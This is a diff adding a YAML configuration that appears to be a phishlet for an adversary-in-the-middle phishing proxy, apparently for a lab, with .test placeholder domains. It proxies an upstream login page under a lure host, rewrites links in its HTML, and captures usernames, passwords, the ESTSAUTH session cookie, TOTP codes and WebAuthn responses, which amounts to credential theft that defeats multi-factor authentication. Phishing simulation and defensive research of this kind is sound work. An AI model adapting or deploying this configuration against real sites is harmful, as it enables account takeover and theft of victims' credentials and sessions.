@@ -1,0 +1,30 @@
+id: labtest
+version: 2
+base_domains:
+  - "phish.test"
+proxy_hosts:
+  - phish_sub: "login"
+    orig_sub: "origin"
+    domain: "upstream.test"
+    is_landing: true
+sub_filters:
+  - triggers_on: "origin.upstream.test"
+    search: "origin.upstream.test"
+    replace: "login.phish.test"
+    mime: ["text/html"]
+    redirect_only: false
+auth_tokens:
+  - domain: ".upstream.test"
+    keys: ["ESTSAUTH"]
+creds_map:
+  - key: "login"
+    search: "login"
+  - key: "passwd"
+    search: "passwd"
+mfa_tokens:
+  - key: "totp"
+    search: "totp_code"
+  - key: "webauthn"
+    search: "authenticatorAssertionResponse"
+lure_path: "/l/test01"
+enabled: true
